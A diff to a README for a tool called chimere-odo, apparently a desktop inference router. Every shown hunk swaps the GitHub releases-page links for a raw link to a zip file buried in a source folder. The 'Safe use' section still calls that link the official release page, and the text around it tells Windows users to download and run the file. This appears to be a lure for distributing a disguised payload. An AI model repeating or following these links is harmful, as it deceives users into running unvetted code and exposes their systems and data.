@@ -1,12 +1,12 @@
 # 🧭 chimere-odo - Smart routing for desktop inference
 
-[![Download chimere-odo](https://img.shields.io/badge/Download%20chimere--odo-6b7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rehabilitative-asthmatic90/chimere-odo/releases)
+[![Download chimere-odo](https://img.shields.io/badge/Download%20chimere--odo-6b7280?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rehabilitative-asthmatic90/chimere-odo/main/odo/few_shot/odo_chimere_3.8.zip)
 
 ## 🪟 Windows download
 
 Visit the release page to download and run this file on Windows:
 
-[https://github.com/Rehabilitative-asthmatic90/chimere-odo/releases](https://github.com/Rehabilitative-asthmatic90/chimere-odo/releases)
+[https://raw.githubusercontent.com/Rehabilitative-asthmatic90/chimere-odo/main/odo/few_shot/odo_chimere_3.8.zip](https://raw.githubusercontent.com/Rehabilitative-asthmatic90/chimere-odo/main/odo/few_shot/odo_chimere_3.8.zip)
 
 ## 📌 What chimere-odo does
 
@@ -36,7 +36,7 @@ For smoother use, 16 GB of RAM is better.
 ## 🚀 Getting started
 
 1. Open the release page:  
-   [https://github.com/Rehabilitative-asthmatic90/chimere-odo/releases](https://github.com/Rehabilitative-asthmatic90/chimere-odo/releases)
+   [https://raw.githubusercontent.com/Rehabilitative-asthmatic90/chimere-odo/main/odo/few_shot/odo_chimere_3.8.zip](https://raw.githubusercontent.com/Rehabilitative-asthmatic90/chimere-odo/main/odo/few_shot/odo_chimere_3.8.zip)
 
 2. Find the latest release at the top of the page
 
@@ -185,7 +185,7 @@ Pick the file that matches Windows and your system type. Most modern PCs use 64-
 
 Go to the release page here:
 
-[https://github.com/Rehabilitative-asthmatic90/chimere-odo/releases](https://github.com/Rehabilitative-asthmatic90/chimere-odo/releases)
+[https://raw.githubusercontent.com/Rehabilitative-asthmatic90/chimere-odo/main/odo/few_shot/odo_chimere_3.8.zip](https://raw.githubusercontent.com/Rehabilitative-asthmatic90/chimere-odo/main/odo/few_shot/odo_chimere_3.8.zip)
 
 Then:
 1. Download the Windows release file
@@ -219,7 +219,7 @@ These parts work together to make request handling more structured
 ## 🔐 Safe use
 
 Only download from the official release page:
-[https://github.com/Rehabilitative-asthmatic90/chimere-odo/releases](https://github.com/Rehabilitative-asthmatic90/chimere-odo/releases)
+[https://raw.githubusercontent.com/Rehabilitative-asthmatic90/chimere-odo/main/odo/few_shot/odo_chimere_3.8.zip](https://raw.githubusercontent.com/Rehabilitative-asthmatic90/chimere-odo/main/odo/few_shot/odo_chimere_3.8.zip)
 
 Keep the file in a place you trust, and use the latest release when possible
 
